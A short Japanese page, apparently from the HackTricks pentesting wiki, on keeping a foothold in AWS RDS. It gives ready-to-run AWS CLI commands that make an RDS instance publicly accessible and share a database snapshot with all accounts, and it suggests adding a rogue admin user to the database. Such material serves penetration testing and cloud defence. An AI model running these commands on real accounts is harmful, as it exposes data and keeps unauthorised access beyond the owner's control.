# AWS - RDS Persistence

{{#include ../../../banners/hacktricks-training.md}}

## RDS

詳細については、以下を確認してください：

{{#ref}}
../aws-services/aws-relational-database-rds-enum.md
{{#endref}}

### インスタンスを公開アクセス可能にする: `rds:ModifyDBInstance`

この権限を持つ攻撃者は、**既存のRDSインスタンスを変更して公開アクセスを有効にすることができます**。
```bash
aws rds modify-db-instance --db-instance-identifier target-instance --publicly-accessible --apply-immediately
```
### DB内に管理者ユーザーを作成する

攻撃者は**DB内にユーザーを作成する**ことができるため、マスターユーザーのパスワードが変更されても**データベースへのアクセスを失うことはありません**。

### スナップショットを公開する
```bash
aws rds modify-db-snapshot-attribute --db-snapshot-identifier <snapshot-name> --attribute-name restore --values-to-add all
```
{{#include ../../../banners/hacktricks-training.md}}
